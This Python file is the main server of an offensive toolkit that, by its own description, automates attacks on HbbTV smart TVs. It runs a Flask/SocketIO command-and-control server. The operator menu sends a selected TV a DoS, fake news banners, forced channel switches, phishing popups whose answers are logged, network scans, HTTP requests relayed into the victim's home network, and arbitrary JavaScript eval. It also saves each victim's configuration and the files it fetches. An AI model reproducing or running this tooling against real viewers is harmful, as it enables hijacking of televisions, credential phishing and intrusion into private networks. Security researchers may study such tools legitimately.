import threading
import sys
import argparse
import logging
import colorlog
import json
import datetime
import mimetypes
import base64
from flask import Flask, send_from_directory, request
from flask_socketio import SocketIO, send, emit
from pathlib import Path

import prompt
from ClientManager import ClientManager
from request_data import request_config, request_appMgr, request_appObject
from dos import start_dos
from fakenews import show_fake_banner, destroy_fake_banner
from channel_switch import channel_switch_next, channel_switch_prev
from phishing import send_phishing_popup
from net_scan import start_netscan
from http_request import http_request_from_client_selection, http_request_from_url

logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG)
ch = colorlog.StreamHandler()
formatter = colorlog.ColoredFormatter('%(levelname)s - %(message)s')
ch.setFormatter(formatter)
ch.setLevel(logging.DEBUG)
logger.addHandler(ch)

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

cli = sys.modules['flask.cli']
cli.show_server_banner = lambda *x: None

app = Flask(__name__)
socketio = SocketIO(app)
flask_thread = None
running_bool = True
query_id = 0
client_manager = ClientManager(logger)

# Custom static file route
@app.route('/hbbtv/<path:filename>')
def custom_static(filename):
    logger.debug(f'New request coming from {request.remote_addr} for hbbtv/{filename}')
    response = send_from_directory('hbbtv', filename)
    # Add custom headers
    if filename.endswith('.html'):
        response.headers['Content-Type'] = 'application/vnd.hbbtv.xhtml+xml'
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    response.headers['Access-Control-Allow-Origin'] = '*'
    return response

@socketio.on('connect')
def handle_connect():
    sid = request.sid
    ip = request.remote_addr
    info = json.loads(request.args.get('info', ''))
    client_manager.add_client(sid, ip, info)

@socketio.on('disconnect')
def handle_disconnect():
    sid = request.sid
    client_manager.remove_client(sid)

@socketio.on('response')
def handle_response(data):
    logger.info(f'Received response from {request.sid} to query id: {data.get('qId', 'Undefined')}\nResponse: {data.get('response', 'Undefined')}')

@socketio.on('config-response')
def handle_config_response(data):
    filename = f'config/config-{request.sid}-{datetime.datetime.now():%Y-%m-%d_%H:%M:%S}.json'
    logger.info(f'Received config response from {request.sid}. Writing result to {filename}')
    output_f = Path(filename)
    output_f.parent.mkdir(exist_ok=True, parents=True)  
    with open(output_f, "w") as f:
        json.dump(data, f)

@socketio.on('appObject-response')
def handle_appObject_response(data):
    filename = f'appObject/appObject-{request.sid}-{datetime.datetime.now():%Y-%m-%d_%H:%M:%S}.json'
    logger.info(f'Received config response from {request.sid}. Writing result to {filename}')
    output_f = Path(filename)
    output_f.parent.mkdir(exist_ok=True, parents=True)  
    with open(output_f, "w") as f:
        json.dump(data, f)

@socketio.on('appMgr-response')
def handle_appMgr_response(data):
    filename = f'appMgr/appMgr-{request.sid}-{datetime.datetime.now():%Y-%m-%d_%H:%M:%S}.json'
    logger.info(f'Received config response from {request.sid}. Writing result to {filename}')
    output_f = Path(filename)
    output_f.parent.mkdir(exist_ok=True, parents=True)  
    with open(output_f, "w") as f:
        json.dump(data, f)

@socketio.on('phishing-response')
def handle_phishing_response(data):
    filename = f'phishing/phishing-{datetime.datetime.now():%Y-%m-%d}.json'
    logger.info(f'Received phishing response from {request.sid}. Appending to {filename}')
    output_f = Path(filename)
    output_f.parent.mkdir(exist_ok=True, parents=True)
    with open(output_f, "a+") as f:
        d = {'sid': request.sid, "input": data.get("input", None), "question": data.get('question', None)}
        json.dump(d, f)
        f.write('\n')

@socketio.on('netscan-response')
def handle_netscan_response(data):
    filename = f'netscan/netscan-{request.sid}-{datetime.datetime.now():%Y-%m-%d_%H:%M:%S}.json'
    logger.info(f'Received netscan response from {request.sid}. Writing result to {filename}')
    output_f = Path(filename)
    output_f.parent.mkdir(exist_ok=True, parents=True)
    # Add netscan result to client
    client = client_manager.get_client_by_sid(request.sid)
    if client == None:
        logger.error("Received netscan-data from unknown client")
        return
    
    client.scan = data.get("scan", None)
    with open(output_f, "w") as f:
        json.dump(data, f)

@socketio.on('netscan-logger')
def handle_netscan_logger(data):
    filename = f'netscan/logs/netscan-log-{request.sid}-{datetime.datetime.now():%Y-%m-%d}.log'
    logger.debug(f'{request.sid} - {data.get('message', None)}')
    output_f = Path(filename)
    output_f.parent.mkdir(exist_ok=True, parents=True)
    with open(output_f, "a+") as f:
        f.write(f'{data.get('message', None)}\n')

@socketio.on('request-success')
def handle_request_success(data):
    res = data.get('response', None)
    if res == None:
        logger.error(f'{request.sid} - {data.get('method', None)} request from {data.get('url', None)} failed because response is empty!')
        return
    fileb64 = res.get('file', None)
    headers = res.get('headers', None)
    if fileb64 == None:
        logger.error(f'{request.sid} - {data.get('method', None)} request from {data.get('url', None)} failed because file is empty!')
        return
    if headers == None:
        logger.error(f'{request.sid} - {data.get('method', None)} request from {data.get('url', None)} failed headers are empty!')
        return
    file_mimetype = headers.get("content-type").split(';')[0].strip()
    file_ext = mimetypes.guess_extension(file_mimetype)
    if file_ext == None:
        file_ext = '.bin'
    filename = f'requests/success/file-{request.sid}-{datetime.datetime.now():%Y-%m-%d_%H:%M:%S}{file_ext}'
    logger.info(f'{request.sid} - {data.get('method')} request from {data.get('url')} was successful! Saving under {filename}')
    output_f = Path(filename)
    output_f.parent.mkdir(exist_ok=True, parents=True)
    with open(output_f, "wb") as f:
        f.write(base64.decodebytes(fileb64.encode()))

@socketio.on('request-failed')
def handle_request_failed(data):
    filename = f'requests/fail/request-fail-{request.sid}-{datetime.datetime.now():%Y-%m-%d_%H:%M:%S}.json'
    logger.error(f'{request.sid} - {data.get('method', None)} request from {data.get('url', None)} failed with error {data.get('error', None)}')
    output_f = Path(filename)
    output_f.parent.mkdir(exist_ok=True, parents=True)
    with open(output_f, "w") as f:
        json.dump(data, f)


def show_main_menu():
    main_menu_dict = {
        "Show client info": info_menu,
        "Request client configuration": request_config_menu,
        "Request client appObject": request_appObject_menu,
        "Request client appMgr": request_appMgr_menu,
        "Start DoS": dos_menu,
        "Fake Banner": fakenews_menu,
        "Switch Channel": switch_channel_menu,
        "Start Phishing": phishing_menu,
        "Start Network Scan": network_scan_menu,
        "Send HTTP Request": http_request_menu,
        "JS eval": js_eval_menu,
        "Redirect to URL": redirect_menu,
        "Reload Target": reload_menu,
        "Shutdown": shutdown,
    }
    global running_bool
    while running_bool:
        prompt.dict_menu(main_menu_dict)
        #break

def do_client_selection(clients):
    if len(clients) == 0:
        print('No clients connected!')
        print('Returning back...')
        return -1
    client_options = [f'{i+1}. {c.sid} - {c.ip}' for i, c in enumerate(clients)]
    client_options.append('Back')
    sel = prompt.menu_index(client_options)
    if sel == len(clients):
        print('Returning back')
        return -1
    return sel

def js_eval_menu():
    print("\033[31mWarning!\033[0m This is a dangerous function executing javascript directly on target!")
    print("\033[31mYou can lose access to the target!\033[0m")
    clients = client_manager.get_all_clients()
    sel = do_client_selection(clients)
    if sel == -1:
        return
    js_eval(clients[sel])
    

def js_eval(client):
    global query_id
    query_id += 1
    with app.app_context():
        code = input("Code to eval on target: ")
        socketio.emit('js-eval', {'code': code, 'qId': query_id}, to=client.sid)
        logger.info(f'Sent following code: {code} to client with sid: {client.sid}. Query ID: {query_id}')

def info_menu():
    clients = client_manager.get_all_clients()
    sel = do_client_selection(clients)
    if sel == -1:
        return
    client = clients[sel]
    print(f'Client No. {sel+1}')
    print(f'SID: {client.sid}')
    print(f'IP: {client.ip}')
    print(f'Browser Info: {json.dumps(client.info, indent=4, sort_keys=True)}')
    print(f'Network Info: {json.dumps(client.scan, indent=4, sort_keys=True)}')

def request_config_menu():
    clients = client_manager.get_all_clients()
    sel = do_client_selection(clients)
    if sel == -1:
        return
    client = clients[sel]
    request_config(socketio, client.sid, logger)

def request_appObject_menu():
    clients = client_manager.get_all_clients()
    sel = do_client_selection(clients)
    if sel == -1:
        return
    client = clients[sel]
    request_appObject(socketio, client.sid, logger)

def request_appMgr_menu():
    clients = client_manager.get_all_clients()
    sel = do_client_selection(clients)
    if sel == -1:
        return
    client = clients[sel]
    request_appMgr(socketio, client.sid, logger)


def dos_menu():
    clients = client_manager.get_all_clients()
    sel = do_client_selection(clients)
    if sel == -1:
        return
    client = clients[sel]
    start_dos(client.sid, socketio, logger)

def fakenews_menu():
    clients = client_manager.get_all_clients()
    sel = do_client_selection(clients)
    if sel == -1:
        return
    client = clients[sel]
    fakenews_menu_dict = {
        "Show banner": (lambda: show_fake_banner(client.sid, socketio, logger)),
        "Destroy banner": (lambda: destroy_fake_banner(client.sid, socketio, logger))
    }
    prompt.dict_menu(fakenews_menu_dict)

def phishing_menu():
    clients = client_manager.get_all_clients()
    sel = do_client_selection(clients)
    if sel == -1:
        return
    client = clients[sel]
    send_phishing_popup(client.sid, socketio, logger)

def network_scan_menu():
    clients = client_manager.get_all_clients()
    sel = do_client_selection(clients)
    if sel == -1:
        return
    client = clients[sel]
    start_netscan(client.sid, socketio, logger)

def http_request_menu():
    clients = client_manager.get_all_clients()
    sel = do_client_selection(clients)
    if sel == -1:
        return
    client = clients[sel]
    options = {
        "Request from devices on the client's network": (lambda: http_request_from_client_selection(client, socketio, logger)),
        "Request from URL": (lambda: http_request_from_url(client, socketio, logger))
    }
    prompt.dict_menu(options)

def switch_channel_menu():
    print("\033[31mWarning!\033[0m This is a dangerous function changing channel directly on target!")
    print("\033[31mYou can lose access to the target!\033[0m")
    clients = client_manager.get_all_clients()
    sel = do_client_selection(clients)
    if sel == -1:
        return
    client = clients[sel]
    switch_channel_menu_dict = {
        "Next Channel": (lambda: channel_switch_next(client.sid, socketio, logger)),
        "Previous Channel": (lambda: channel_switch_prev(client.sid, socketio, logger)),
    }
    prompt.dict_menu(switch_channel_menu_dict)

def redirect_menu():
    clients = client_manager.get_all_clients()
    sel = do_client_selection(clients)
    if sel == -1:
        return
    client = clients[sel]
    url = input("URL to redirect to: ")
    socketio.emit('redirect', {'url': url}, to=client.sid)

def reload_menu():
    clients = client_manager.get_all_clients()
    sel = do_client_selection(clients)
    if sel == -1:
        return
    client = clients[sel]
    socketio.emit('reload', to=client.sid)

def shutdown():
    global running_bool
    running_bool = False
    logger.info("Shutting down!")


if __name__ == "__main__":  
    parser = argparse.ArgumentParser(description="A Toolkit helping automatize attacks on HbbTV supported Smart TVs.")
    parser.add_argument('-ip', type=str, required=False, help="The IP address to bind the server to. (default 0.0.0.0)", default="0.0.0.0")
    parser.add_argument('-p', type=int, required=False, help="The port number to bind the server to. (default 5000)", default=5000)
    args = parser.parse_args()
    logger.info("Starting the toolkit...")
    flask_thread = threading.Thread(target=lambda: app.run(host=args.ip, port=args.p, debug=False, use_reloader=False), daemon=True)
    flask_thread.start()
    logger.info(f"Server started at {args.ip}:{args.p}.")
    show_main_menu()
